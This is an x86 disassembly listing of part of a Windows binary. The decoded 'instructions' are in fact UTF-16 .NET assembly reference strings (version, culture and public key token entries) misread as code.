  40a249:	add    BYTE PTR ds:0x30002e00,dh
  40a24f:	add    BYTE PTR [esi],ch
  40a251:	add    BYTE PTR [eax],dh
  40a253:	add    BYTE PTR [eax+eax*1],ch
  40a256:	and    BYTE PTR [eax],al
  40a258:	inc    ebx
  40a259:	add    BYTE PTR [ebp+0x0],dh
  40a25c:	ins    BYTE PTR es:[edi],dx
  40a25d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a261:	add    BYTE PTR [edx+0x0],dh
  40a264:	add    BYTE PTR gs:0x65006e00,bh
  40a26b:	add    BYTE PTR [ebp+0x0],dh
  40a26e:	je     0x40a270
  40a270:	jb     0x40a272
  40a272:	popa   
  40a273:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a277:	add    BYTE PTR [eax],ah
  40a279:	add    BYTE PTR [eax+0x0],dl
  40a27c:	jne    0x40a27e
  40a27e:	bound  eax,QWORD PTR [eax]
  40a280:	ins    BYTE PTR es:[edi],dx
  40a281:	add    BYTE PTR [ecx+0x0],ch
  40a284:	arpl   WORD PTR [eax],ax
  40a286:	dec    ebx
  40a287:	add    BYTE PTR [ebp+0x0],ah
  40a28a:	jns    0x40a28c
  40a28c:	push   esp
  40a28d:	add    BYTE PTR [edi+0x0],ch
  40a290:	imul   eax,DWORD PTR [eax],0x65
  40a293:	add    BYTE PTR [esi+0x0],ch
  40a296:	cmp    eax,0x31003300
  40a29b:	add    BYTE PTR [edx+0x0],ah
  40a29e:	data16 add BYTE PTR [ebx],dh
  40a2a1:	add    BYTE PTR [eax],bh
  40a2a3:	add    BYTE PTR ds:0x61003600,dh
  40a2a9:	add    BYTE PTR [eax+eax*1+0x33],ah
  40a2ad:	add    BYTE PTR [esi],dh
  40a2af:	add    BYTE PTR [eax+eax*1],dh
  40a2b2:	add    BYTE PTR gs:[ebx],dh
  40a2b5:	add    BYTE PTR ds:0x53be8000,dh
  40a2bb:	add    BYTE PTR [ecx+0x0],bh
  40a2be:	jae    0x40a2c0
  40a2c0:	je     0x40a2c2
  40a2c2:	add    BYTE PTR gs:[ebp+0x0],ch
  40a2c6:	add    BYTE PTR cs:[edi+0x0],dl
  40a2ca:	add    BYTE PTR gs:[edx+0x0],ah
  40a2ce:	add    BYTE PTR cs:[ebp+0x0],al
  40a2d2:	js     0x40a2d4
  40a2d4:	je     0x40a2d6
  40a2d6:	add    BYTE PTR gs:[esi+0x0],ch
  40a2da:	jae    0x40a2dc
  40a2dc:	imul   eax,DWORD PTR [eax],0x6e006f
  40a2e2:	jae    0x40a2e4
  40a2e4:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40a2e9:	add    BYTE PTR [ebx+0x0],dh
  40a2ec:	imul   eax,DWORD PTR [eax],0x6e0067
  40a2f2:	sub    al,0x0
  40a2f4:	and    BYTE PTR [eax],al
  40a2f6:	push   esi
  40a2f7:	add    BYTE PTR [ebp+0x0],ah
  40a2fa:	jb     0x40a2fc
  40a2fc:	jae    0x40a2fe
  40a2fe:	imul   eax,DWORD PTR [eax],0x6e006f
  40a304:	cmp    eax,0x2e003300
  40a309:	add    BYTE PTR ds:0x30002e00,dh
  40a30f:	add    BYTE PTR [esi],ch
  40a311:	add    BYTE PTR [eax],dh
  40a313:	add    BYTE PTR [eax+eax*1],ch
  40a316:	and    BYTE PTR [eax],al
  40a318:	inc    ebx
  40a319:	add    BYTE PTR [ebp+0x0],dh
  40a31c:	ins    BYTE PTR es:[edi],dx
  40a31d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a321:	add    BYTE PTR [edx+0x0],dh
  40a324:	add    BYTE PTR gs:0x65006e00,bh
  40a32b:	add    BYTE PTR [ebp+0x0],dh
  40a32e:	je     0x40a330
  40a330:	jb     0x40a332
  40a332:	popa   
  40a333:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a337:	add    BYTE PTR [eax],ah
  40a339:	add    BYTE PTR [eax+0x0],dl
  40a33c:	jne    0x40a33e
  40a33e:	bound  eax,QWORD PTR [eax]
  40a340:	ins    BYTE PTR es:[edi],dx
  40a341:	add    BYTE PTR [ecx+0x0],ch
  40a344:	arpl   WORD PTR [eax],ax
  40a346:	dec    ebx
  40a347:	add    BYTE PTR [ebp+0x0],ah
  40a34a:	jns    0x40a34c
  40a34c:	push   esp
  40a34d:	add    BYTE PTR [edi+0x0],ch
  40a350:	imul   eax,DWORD PTR [eax],0x65
  40a353:	add    BYTE PTR [esi+0x0],ch
  40a356:	cmp    eax,0x31003300
  40a35b:	add    BYTE PTR [edx+0x0],ah
  40a35e:	data16 add BYTE PTR [ebx],dh
  40a361:	add    BYTE PTR [eax],bh
  40a363:	add    BYTE PTR ds:0x61003600,dh
  40a369:	add    BYTE PTR [eax+eax*1+0x33],ah
  40a36d:	add    BYTE PTR [esi],dh
  40a36f:	add    BYTE PTR [eax+eax*1],dh
  40a372:	add    BYTE PTR gs:[ebx],dh
  40a375:	add    BYTE PTR ds:0x53a88000,dh
  40a37b:	add    BYTE PTR [ecx+0x0],bh
  40a37e:	jae    0x40a380
  40a380:	je     0x40a382
  40a382:	add    BYTE PTR gs:[ebp+0x0],ch
  40a386:	add    BYTE PTR cs:[edi+0x0],dl
  40a38a:	add    BYTE PTR gs:[edx+0x0],ah
  40a38e:	add    BYTE PTR cs:[ebp+0x0],cl
  40a392:	outs   dx,DWORD PTR ds:[esi]
  40a393:	add    BYTE PTR [edx+0x0],ah
  40a396:	imul   eax,DWORD PTR [eax],0x65006c
  40a39c:	sub    al,0x0
  40a39e:	and    BYTE PTR [eax],al
  40a3a0:	push   esi
  40a3a1:	add    BYTE PTR [ebp+0x0],ah
  40a3a4:	jb     0x40a3a6
  40a3a6:	jae    0x40a3a8
  40a3a8:	imul   eax,DWORD PTR [eax],0x6e006f
  40a3ae:	cmp    eax,0x2e003200
  40a3b3:	add    BYTE PTR [eax],dh
  40a3b5:	add    BYTE PTR [esi],ch
  40a3b7:	add    BYTE PTR [eax],dh
  40a3b9:	add    BYTE PTR [esi],ch
  40a3bb:	add    BYTE PTR [eax],dh
  40a3bd:	add    BYTE PTR [eax+eax*1],ch
  40a3c0:	and    BYTE PTR [eax],al
  40a3c2:	inc    ebx
  40a3c3:	add    BYTE PTR [ebp+0x0],dh
  40a3c6:	ins    BYTE PTR es:[edi],dx
  40a3c7:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a3cb:	add    BYTE PTR [edx+0x0],dh
  40a3ce:	add    BYTE PTR gs:0x65006e00,bh
  40a3d5:	add    BYTE PTR [ebp+0x0],dh
  40a3d8:	je     0x40a3da
  40a3da:	jb     0x40a3dc
  40a3dc:	popa   
  40a3dd:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a3e1:	add    BYTE PTR [eax],ah
  40a3e3:	add    BYTE PTR [eax+0x0],dl
  40a3e6:	jne    0x40a3e8
  40a3e8:	bound  eax,QWORD PTR [eax]
  40a3ea:	ins    BYTE PTR es:[edi],dx
  40a3eb:	add    BYTE PTR [ecx+0x0],ch
  40a3ee:	arpl   WORD PTR [eax],ax
  40a3f0:	dec    ebx
  40a3f1:	add    BYTE PTR [ebp+0x0],ah
  40a3f4:	jns    0x40a3f6
  40a3f6:	push   esp
  40a3f7:	add    BYTE PTR [edi+0x0],ch
  40a3fa:	imul   eax,DWORD PTR [eax],0x65
  40a3fd:	add    BYTE PTR [esi+0x0],ch
  40a400:	cmp    eax,0x30006200
  40a405:	add    BYTE PTR [ebx],dh
  40a407:	add    BYTE PTR [esi+0x0],ah
  40a40a:	xor    eax,0x37006600
  40a40f:	add    BYTE PTR [esi+0x0],ah
  40a412:	xor    DWORD PTR [eax],eax
  40a414:	xor    DWORD PTR [eax],eax
  40a416:	add    BYTE PTR fs:0x61003000,dh
  40a41d:	add    BYTE PTR [ebx],dh
  40a41f:	add    BYTE PTR [ecx+0x0],ah
  40a422:	add    al,0x53
  40a425:	add    BYTE PTR [ecx+0x0],bh
  40a428:	jae    0x40a42a
  40a42a:	je     0x40a42c
  40a42c:	add    BYTE PTR gs:[ebp+0x0],ch
  40a430:	add    BYTE PTR cs:[edi+0x0],dl
  40a434:	add    BYTE PTR gs:[edx+0x0],ah
  40a438:	add    BYTE PTR cs:[edx+0x0],dl
  40a43c:	add    BYTE PTR gs:[edi+0x0],ah
  40a440:	jne    0x40a442
  40a442:	ins    BYTE PTR es:[edi],dx
  40a443:	add    BYTE PTR [ecx+0x0],ah
  40a446:	jb     0x40a448
  40a448:	inc    ebp
  40a449:	add    BYTE PTR [eax+0x0],bh
  40a44c:	jo     0x40a44e
  40a44e:	jb     0x40a450
  40a450:	add    BYTE PTR gs:[ebx+0x0],dh
  40a454:	jae    0x40a456
  40a456:	imul   eax,DWORD PTR [eax],0x6e006f
  40a45c:	jae    0x40a45e
  40a45e:	sub    al,0x0
  40a460:	and    BYTE PTR [eax],al
  40a462:	push   esi
  40a463:	add    BYTE PTR [ebp+0x0],ah
  40a466:	jb     0x40a468
  40a468:	jae    0x40a46a
  40a46a:	imul   eax,DWORD PTR [eax],0x6e006f
  40a470:	cmp    eax,0x2e003200
  40a475:	add    BYTE PTR [eax],dh
  40a477:	add    BYTE PTR [esi],ch
  40a479:	add    BYTE PTR [eax],dh
  40a47b:	add    BYTE PTR [esi],ch
  40a47d:	add    BYTE PTR [eax],dh
  40a47f:	add    BYTE PTR [eax+eax*1],ch
  40a482:	and    BYTE PTR [eax],al
  40a484:	inc    ebx
  40a485:	add    BYTE PTR [ebp+0x0],dh
  40a488:	ins    BYTE PTR es:[edi],dx
  40a489:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a48d:	add    BYTE PTR [edx+0x0],dh
  40a490:	add    BYTE PTR gs:0x65006e00,bh
  40a497:	add    BYTE PTR [ebp+0x0],dh
  40a49a:	je     0x40a49c
  40a49c:	jb     0x40a49e
  40a49e:	popa   
  40a49f:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a4a3:	add    BYTE PTR [eax],ah
  40a4a5:	add    BYTE PTR [eax+0x0],dl
  40a4a8:	jne    0x40a4aa
  40a4aa:	bound  eax,QWORD PTR [eax]
  40a4ac:	ins    BYTE PTR es:[edi],dx
  40a4ad:	add    BYTE PTR [ecx+0x0],ch
  40a4b0:	arpl   WORD PTR [eax],ax
  40a4b2:	dec    ebx
  40a4b3:	add    BYTE PTR [ebp+0x0],ah
  40a4b6:	jns    0x40a4b8
  40a4b8:	push   esp
  40a4b9:	add    BYTE PTR [edi+0x0],ch
  40a4bc:	imul   eax,DWORD PTR [eax],0x65
  40a4bf:	add    BYTE PTR [esi+0x0],ch
  40a4c2:	cmp    eax,0x30006200
  40a4c7:	add    BYTE PTR [ebx],dh
  40a4c9:	add    BYTE PTR [esi+0x0],ah
  40a4cc:	xor    eax,0x37006600
  40a4d1:	add    BYTE PTR [esi+0x0],ah
  40a4d4:	xor    DWORD PTR [eax],eax
  40a4d6:	xor    DWORD PTR [eax],eax
  40a4d8:	add    BYTE PTR fs:0x61003000,dh
  40a4df:	add    BYTE PTR [ebx],dh
  40a4e1:	add    BYTE PTR [ecx+0x0],ah
  40a4e4:	sub    BYTE PTR [edx+0x790053],0x73
  40a4eb:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a4ef:	add    BYTE PTR [ebp+0x0],ch
  40a4f2:	add    BYTE PTR cs:[edi+0x0],dl
  40a4f6:	add    BYTE PTR gs:[edx+0x0],ah
  40a4fa:	add    BYTE PTR cs:[edx+0x0],dl
  40a4fe:	outs   dx,DWORD PTR ds:[esi]
  40a4ff:	add    BYTE PTR [ebp+0x0],dh
  40a502:	je     0x40a504
  40a504:	imul   eax,DWORD PTR [eax],0x67006e
  40a50a:	sub    al,0x0
  40a50c:	and    BYTE PTR [eax],al
  40a50e:	push   esi
  40a50f:	add    BYTE PTR [ebp+0x0],ah
  40a512:	jb     0x40a514
  40a514:	jae    0x40a516
  40a516:	imul   eax,DWORD PTR [eax],0x6e006f
  40a51c:	cmp    eax,0x2e003300
  40a521:	add    BYTE PTR ds:0x30002e00,dh
  40a527:	add    BYTE PTR [esi],ch
  40a529:	add    BYTE PTR [eax],dh
  40a52b:	add    BYTE PTR [eax+eax*1],ch
  40a52e:	and    BYTE PTR [eax],al
  40a530:	inc    ebx
  40a531:	add    BYTE PTR [ebp+0x0],dh
  40a534:	ins    BYTE PTR es:[edi],dx
  40a535:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a539:	add    BYTE PTR [edx+0x0],dh
  40a53c:	add    BYTE PTR gs:0x65006e00,bh
  40a543:	add    BYTE PTR [ebp+0x0],dh
  40a546:	je     0x40a548
  40a548:	jb     0x40a54a
  40a54a:	popa   
  40a54b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a54f:	add    BYTE PTR [eax],ah
  40a551:	add    BYTE PTR [eax+0x0],dl
  40a554:	jne    0x40a556
  40a556:	bound  eax,QWORD PTR [eax]
  40a558:	ins    BYTE PTR es:[edi],dx
  40a559:	add    BYTE PTR [ecx+0x0],ch
  40a55c:	arpl   WORD PTR [eax],ax
  40a55e:	dec    ebx
  40a55f:	add    BYTE PTR [ebp+0x0],ah
  40a562:	jns    0x40a564
  40a564:	push   esp
  40a565:	add    BYTE PTR [edi+0x0],ch
  40a568:	imul   eax,DWORD PTR [eax],0x65
  40a56b:	add    BYTE PTR [esi+0x0],ch
  40a56e:	cmp    eax,0x31003300
  40a573:	add    BYTE PTR [edx+0x0],ah
  40a576:	data16 add BYTE PTR [ebx],dh
  40a579:	add    BYTE PTR [eax],bh
  40a57b:	add    BYTE PTR ds:0x61003600,dh
  40a581:	add    BYTE PTR [eax+eax*1+0x33],ah
  40a585:	add    BYTE PTR [esi],dh
  40a587:	add    BYTE PTR [eax+eax*1],dh
  40a58a:	add    BYTE PTR gs:[ebx],dh
  40a58d:	add    BYTE PTR ds:0x53ac8000,dh
  40a593:	add    BYTE PTR [ecx+0x0],bh
  40a596:	jae    0x40a598
  40a598:	je     0x40a59a
  40a59a:	add    BYTE PTR gs:[ebp+0x0],ch
  40a59e:	add    BYTE PTR cs:[edi+0x0],dl
  40a5a2:	add    BYTE PTR gs:[edx+0x0],ah
  40a5a6:	add    BYTE PTR cs:[ebx+0x0],dl
  40a5aa:	add    BYTE PTR gs:[edx+0x0],dh
  40a5ae:	jbe    0x40a5b0
  40a5b0:	imul   eax,DWORD PTR [eax],0x650063
  40a5b6:	jae    0x40a5b8
  40a5b8:	sub    al,0x0
  40a5ba:	and    BYTE PTR [eax],al
  40a5bc:	push   esi
  40a5bd:	add    BYTE PTR [ebp+0x0],ah
  40a5c0:	jb     0x40a5c2
  40a5c2:	jae    0x40a5c4
  40a5c4:	imul   eax,DWORD PTR [eax],0x6e006f
  40a5ca:	cmp    eax,0x2e003200
  40a5cf:	add    BYTE PTR [eax],dh
  40a5d1:	add    BYTE PTR [esi],ch
  40a5d3:	add    BYTE PTR [eax],dh
  40a5d5:	add    BYTE PTR [esi],ch
  40a5d7:	add    BYTE PTR [eax],dh
  40a5d9:	add    BYTE PTR [eax+eax*1],ch
  40a5dc:	and    BYTE PTR [eax],al
  40a5de:	inc    ebx
  40a5df:	add    BYTE PTR [ebp+0x0],dh
  40a5e2:	ins    BYTE PTR es:[edi],dx
  40a5e3:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a5e7:	add    BYTE PTR [edx+0x0],dh
  40a5ea:	add    BYTE PTR gs:0x65006e00,bh
  40a5f1:	add    BYTE PTR [ebp+0x0],dh
  40a5f4:	je     0x40a5f6
  40a5f6:	jb     0x40a5f8
  40a5f8:	popa   
  40a5f9:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a5fd:	add    BYTE PTR [eax],ah
  40a5ff:	add    BYTE PTR [eax+0x0],dl
  40a602:	jne    0x40a604
  40a604:	bound  eax,QWORD PTR [eax]
  40a606:	ins    BYTE PTR es:[edi],dx
  40a607:	add    BYTE PTR [ecx+0x0],ch
  40a60a:	arpl   WORD PTR [eax],ax
  40a60c:	dec    ebx
  40a60d:	add    BYTE PTR [ebp+0x0],ah
  40a610:	jns    0x40a612
  40a612:	push   esp
  40a613:	add    BYTE PTR [edi+0x0],ch
  40a616:	imul   eax,DWORD PTR [eax],0x65
  40a619:	add    BYTE PTR [esi+0x0],ch
  40a61c:	cmp    eax,0x30006200
  40a621:	add    BYTE PTR [ebx],dh
  40a623:	add    BYTE PTR [esi+0x0],ah
  40a626:	xor    eax,0x37006600
  40a62b:	add    BYTE PTR [esi+0x0],ah
  40a62e:	xor    DWORD PTR [eax],eax
  40a630:	xor    DWORD PTR [eax],eax
  40a632:	add    BYTE PTR fs:0x61003000,dh
  40a639:	add    BYTE PTR [ebx],dh
  40a63b:	add    BYTE PTR [ecx+0x0],ah
  40a63e:	xor    BYTE PTR [edx+0x69004d],0x63
  40a645:	add    BYTE PTR [edx+0x0],dh
  40a648:	outs   dx,DWORD PTR ds:[esi]
  40a649:	add    BYTE PTR [ebx+0x0],dh
  40a64c:	outs   dx,DWORD PTR ds:[esi]
  40a64d:	add    BYTE PTR [esi+0x0],ah
  40a650:	je     0x40a652
  40a652:	add    BYTE PTR cs:[esi+0x0],dl
  40a656:	imul   eax,DWORD PTR [eax],0x750073
  40a65c:	popa   
  40a65d:	add    BYTE PTR [eax+eax*1+0x53],ch
  40a661:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a665:	add    BYTE PTR [eax+eax*1+0x69],ah
  40a669:	add    BYTE PTR [edi+0x0],ch
  40a66c:	sub    al,0x0
  40a66e:	and    BYTE PTR [eax],al
  40a670:	push   esi
  40a671:	add    BYTE PTR [ebp+0x0],ah
  40a674:	jb     0x40a676
  40a676:	jae    0x40a678
  40a678:	imul   eax,DWORD PTR [eax],0x6e006f
  40a67e:	cmp    eax,0x2e003200
  40a683:	add    BYTE PTR [eax],dh
  40a685:	add    BYTE PTR [esi],ch
  40a687:	add    BYTE PTR [eax],dh
  40a689:	add    BYTE PTR [esi],ch
  40a68b:	add    BYTE PTR [eax],dh
  40a68d:	add    BYTE PTR [eax+eax*1],ch
  40a690:	and    BYTE PTR [eax],al
  40a692:	inc    ebx
  40a693:	add    BYTE PTR [ebp+0x0],dh
  40a696:	ins    BYTE PTR es:[edi],dx
  40a697:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a69b:	add    BYTE PTR [edx+0x0],dh
  40a69e:	add    BYTE PTR gs:0x65006e00,bh
  40a6a5:	add    BYTE PTR [ebp+0x0],dh
  40a6a8:	je     0x40a6aa
  40a6aa:	jb     0x40a6ac
  40a6ac:	popa   
  40a6ad:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a6b1:	add    BYTE PTR [eax],ah
  40a6b3:	add    BYTE PTR [eax+0x0],dl
  40a6b6:	jne    0x40a6b8
  40a6b8:	bound  eax,QWORD PTR [eax]
  40a6ba:	ins    BYTE PTR es:[edi],dx
  40a6bb:	add    BYTE PTR [ecx+0x0],ch
  40a6be:	arpl   WORD PTR [eax],ax
  40a6c0:	dec    ebx
  40a6c1:	add    BYTE PTR [ebp+0x0],ah
  40a6c4:	jns    0x40a6c6
  40a6c6:	push   esp
  40a6c7:	add    BYTE PTR [edi+0x0],ch
  40a6ca:	imul   eax,DWORD PTR [eax],0x65
  40a6cd:	add    BYTE PTR [esi+0x0],ch
  40a6d0:	cmp    eax,0x30006200
  40a6d5:	add    BYTE PTR [ebx],dh
  40a6d7:	add    BYTE PTR [esi+0x0],ah
  40a6da:	xor    eax,0x37006600
  40a6df:	add    BYTE PTR [esi+0x0],ah
  40a6e2:	xor    DWORD PTR [eax],eax
  40a6e4:	xor    DWORD PTR [eax],eax
  40a6e6:	add    BYTE PTR fs:0x61003000,dh
  40a6ed:	add    BYTE PTR [ebx],dh
  40a6ef:	add    BYTE PTR [ecx+0x0],ah
  40a6f2:	or     dh,0x4d
  40a6f5:	add    BYTE PTR [ecx+0x0],ch
  40a6f8:	arpl   WORD PTR [eax],ax
  40a6fa:	jb     0x40a6fc
  40a6fc:	outs   dx,DWORD PTR ds:[esi]
  40a6fd:	add    BYTE PTR [ebx+0x0],dh
  40a700:	outs   dx,DWORD PTR ds:[esi]
  40a701:	add    BYTE PTR [esi+0x0],ah
  40a704:	je     0x40a706
  40a706:	add    BYTE PTR cs:[esi+0x0],dl
  40a70a:	imul   eax,DWORD PTR [eax],0x750073
  40a710:	popa   
  40a711:	add    BYTE PTR [eax+eax*1+0x53],ch
  40a715:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a719:	add    BYTE PTR [eax+eax*1+0x69],ah
  40a71d:	add    BYTE PTR [edi+0x0],ch
  40a720:	add    BYTE PTR cs:[edi+0x0],dl
  40a724:	imul   eax,DWORD PTR [eax],0x64006e
  40a72a:	outs   dx,DWORD PTR ds:[esi]
  40a72b:	add    BYTE PTR [edi+0x0],dh
  40a72e:	jae    0x40a730
  40a730:	add    BYTE PTR cs:[esi+0x0],al
  40a734:	outs   dx,DWORD PTR ds:[esi]
  40a735:	add    BYTE PTR [edx+0x0],dh
  40a738:	ins    DWORD PTR es:[edi],dx
  40a739:	add    BYTE PTR [ebx+0x0],dh
  40a73c:	sub    al,0x0
  40a73e:	and    BYTE PTR [eax],al
  40a740:	push   esi
  40a741:	add    BYTE PTR [ebp+0x0],ah
  40a744:	jb     0x40a746
  40a746:	jae    0x40a748
  40a748:	imul   eax,DWORD PTR [eax],0x6e006f
  40a74e:	cmp    eax,0x2e003200
  40a753:	add    BYTE PTR [eax],dh
  40a755:	add    BYTE PTR [esi],ch
  40a757:	add    BYTE PTR [eax],dh
  40a759:	add    BYTE PTR [esi],ch
  40a75b:	add    BYTE PTR [eax],dh
  40a75d:	add    BYTE PTR [eax+eax*1],ch
  40a760:	and    BYTE PTR [eax],al
  40a762:	inc    ebx
  40a763:	add    BYTE PTR [ebp+0x0],dh
  40a766:	ins    BYTE PTR es:[edi],dx
  40a767:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a76b:	add    BYTE PTR [edx+0x0],dh
  40a76e:	add    BYTE PTR gs:0x65006e00,bh
  40a775:	add    BYTE PTR [ebp+0x0],dh
  40a778:	je     0x40a77a
  40a77a:	jb     0x40a77c
  40a77c:	popa   
  40a77d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a781:	add    BYTE PTR [eax],ah
  40a783:	add    BYTE PTR [eax+0x0],dl
  40a786:	jne    0x40a788
  40a788:	bound  eax,QWORD PTR [eax]
  40a78a:	ins    BYTE PTR es:[edi],dx
  40a78b:	add    BYTE PTR [ecx+0x0],ch
  40a78e:	arpl   WORD PTR [eax],ax
  40a790:	dec    ebx
  40a791:	add    BYTE PTR [ebp+0x0],ah
  40a794:	jns    0x40a796
  40a796:	push   esp
  40a797:	add    BYTE PTR [edi+0x0],ch
  40a79a:	imul   eax,DWORD PTR [eax],0x65
  40a79d:	add    BYTE PTR [esi+0x0],ch
  40a7a0:	cmp    eax,0x30006200
  40a7a5:	add    BYTE PTR [ebx],dh
  40a7a7:	add    BYTE PTR [esi+0x0],ah
  40a7aa:	xor    eax,0x37006600
  40a7af:	add    BYTE PTR [esi+0x0],ah
  40a7b2:	xor    DWORD PTR [eax],eax
  40a7b4:	xor    DWORD PTR [eax],eax
  40a7b6:	add    BYTE PTR fs:0x61003000,dh
  40a7bd:	add    BYTE PTR [ebx],dh
  40a7bf:	add    BYTE PTR [ecx+0x0],ah
  40a7c2:	sub    BYTE PTR [esi+edx*2+0x53004a00],0x0
  40a7ca:	push   0x72006100
  40a7cf:	add    BYTE PTR [eax+0x0],dh
  40a7d2:	inc    ebx
  40a7d3:	add    BYTE PTR [edi+0x0],ch
  40a7d6:	add    BYTE PTR fs:[ebp+0x0],ah
  40a7da:	push   eax
  40a7db:	add    BYTE PTR [edx+0x0],dh
  40a7de:	outs   dx,DWORD PTR ds:[esi]
  40a7df:	add    BYTE PTR [esi+0x0],dh
  40a7e2:	imul   eax,DWORD PTR [eax],0x650064
  40a7e8:	jb     0x40a7ea
  40a7ea:	sub    al,0x0
  40a7ec:	and    BYTE PTR [eax],al
  40a7ee:	push   esi
  40a7ef:	add    BYTE PTR [ebp+0x0],ah
  40a7f2:	jb     0x40a7f4
  40a7f4:	jae    0x40a7f6
  40a7f6:	imul   eax,DWORD PTR [eax],0x6e006f
  40a7fc:	cmp    eax,0x2e003200
  40a801:	add    BYTE PTR [eax],dh
  40a803:	add    BYTE PTR [esi],ch
  40a805:	add    BYTE PTR [eax],dh
  40a807:	add    BYTE PTR [esi],ch
  40a809:	add    BYTE PTR [eax],dh
  40a80b:	add    BYTE PTR [eax+eax*1],ch
  40a80e:	and    BYTE PTR [eax],al
  40a810:	inc    ebx
  40a811:	add    BYTE PTR [ebp+0x0],dh
  40a814:	ins    BYTE PTR es:[edi],dx
  40a815:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a819:	add    BYTE PTR [edx+0x0],dh
  40a81c:	add    BYTE PTR gs:0x65006e00,bh
  40a823:	add    BYTE PTR [ebp+0x0],dh
  40a826:	je     0x40a828
  40a828:	jb     0x40a82a
  40a82a:	popa   
  40a82b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a82f:	add    BYTE PTR [eax],ah
  40a831:	add    BYTE PTR [eax+0x0],dl
  40a834:	jne    0x40a836
  40a836:	bound  eax,QWORD PTR [eax]
  40a838:	ins    BYTE PTR es:[edi],dx
  40a839:	add    BYTE PTR [ecx+0x0],ch
  40a83c:	arpl   WORD PTR [eax],ax
  40a83e:	dec    ebx
  40a83f:	add    BYTE PTR [ebp+0x0],ah
  40a842:	jns    0x40a844
  40a844:	push   esp
  40a845:	add    BYTE PTR [edi+0x0],ch
  40a848:	imul   eax,DWORD PTR [eax],0x65
  40a84b:	add    BYTE PTR [esi+0x0],ch
  40a84e:	cmp    eax,0x30006200
  40a853:	add    BYTE PTR [ebx],dh
  40a855:	add    BYTE PTR [esi+0x0],ah
  40a858:	xor    eax,0x37006600
  40a85d:	add    BYTE PTR [esi+0x0],ah
  40a860:	xor    DWORD PTR [eax],eax
  40a862:	xor    DWORD PTR [eax],eax
  40a864:	add    BYTE PTR fs:0x61003000,dh
  40a86b:	add    BYTE PTR [ebx],dh
  40a86d:	add    BYTE PTR [ecx+0x0],ah
  40a870:	and    BYTE PTR [edx+0x0],ah
  40a873:	aaa    
  40a874:	add    BYTE PTR [edx+0x0],ah
  40a877:	add    BYTE PTR fs:[edi],dh
  40a87a:	add    BYTE PTR [esi],dh
  40a87c:	add    BYTE PTR [edi],dh
  40a87e:	add    BYTE PTR [eax],bh
  40a880:	add    BYTE PTR [edx+0x0],ah
  40a883:	cmp    DWORD PTR [eax],eax
  40a885:	aaa    
  40a886:	add    BYTE PTR [edi],dh
  40a888:	add    BYTE PTR [edx+0x0],ah
  40a88b:	add    BYTE PTR fs:[eax],bh
  40a88e:	add    BYTE PTR [esi+0x0],ah
  40a891:	xor    BYTE PTR [edx+0x530041],0x50
  40a898:	add    BYTE PTR [esi],ch
  40a89a:	add    BYTE PTR [edx+0x0],al
  40a89d:	jb     0x40a89f
  40a89f:	outs   dx,DWORD PTR ds:[esi]
  40a8a0:	add    BYTE PTR [edi+0x0],dh
  40a8a3:	jae    0x40a8a5
  40a8a5:	add    BYTE PTR gs:[edx+0x0],dh
  40a8a9:	inc    ebx
  40a8aa:	add    BYTE PTR [ecx+0x0],ah
  40a8ad:	jo     0x40a8af
  40a8af:	jae    0x40a8b1
  40a8b1:	inc    esi
  40a8b2:	add    BYTE PTR [ecx+0x0],ah
  40a8b5:	arpl   WORD PTR [eax],ax
  40a8b7:	je     0x40a8b9
  40a8b9:	outs   dx,DWORD PTR ds:[esi]
  40a8ba:	add    BYTE PTR [edx+0x0],dh
  40a8bd:	jns    0x40a8bf
  40a8bf:	sub    al,0x0
  40a8c1:	and    BYTE PTR [eax],al
  40a8c3:	push   esi
  40a8c4:	add    BYTE PTR [ebp+0x0],ah
  40a8c7:	jb     0x40a8c9
  40a8c9:	jae    0x40a8cb
  40a8cb:	imul   eax,DWORD PTR [eax],0x6e006f
  40a8d1:	cmp    eax,0x2e003200
  40a8d6:	add    BYTE PTR [eax],dh
  40a8d8:	add    BYTE PTR [esi],ch
  40a8da:	add    BYTE PTR [eax],dh
  40a8dc:	add    BYTE PTR [esi],ch
  40a8de:	add    BYTE PTR [eax],dh
  40a8e0:	add    BYTE PTR [eax+eax*1],ch
  40a8e3:	and    BYTE PTR [eax],al
  40a8e5:	inc    ebx
  40a8e6:	add    BYTE PTR [ebp+0x0],dh
  40a8e9:	ins    BYTE PTR es:[edi],dx
  40a8ea:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a8ee:	add    BYTE PTR [edx+0x0],dh
  40a8f1:	add    BYTE PTR gs:0x65006e00,bh
  40a8f8:	add    BYTE PTR [ebp+0x0],dh
  40a8fb:	je     0x40a8fd
  40a8fd:	jb     0x40a8ff
  40a8ff:	popa   
  40a900:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a904:	add    BYTE PTR [eax],ah
  40a906:	add    BYTE PTR [eax+0x0],dl
  40a909:	jne    0x40a90b
  40a90b:	bound  eax,QWORD PTR [eax]
  40a90d:	ins    BYTE PTR es:[edi],dx
  40a90e:	add    BYTE PTR [ecx+0x0],ch
  40a911:	arpl   WORD PTR [eax],ax
  40a913:	dec    ebx
  40a914:	add    BYTE PTR [ebp+0x0],ah
  40a917:	jns    0x40a919
  40a919:	push   esp
  40a91a:	add    BYTE PTR [edi+0x0],ch
  40a91d:	imul   eax,DWORD PTR [eax],0x65
  40a920:	add    BYTE PTR [esi+0x0],ch
  40a923:	cmp    eax,0x37006200
  40a928:	add    BYTE PTR [edx+0x0],ah
  40a92b:	add    BYTE PTR fs:[edi],dh
  40a92e:	add    BYTE PTR [esi],dh
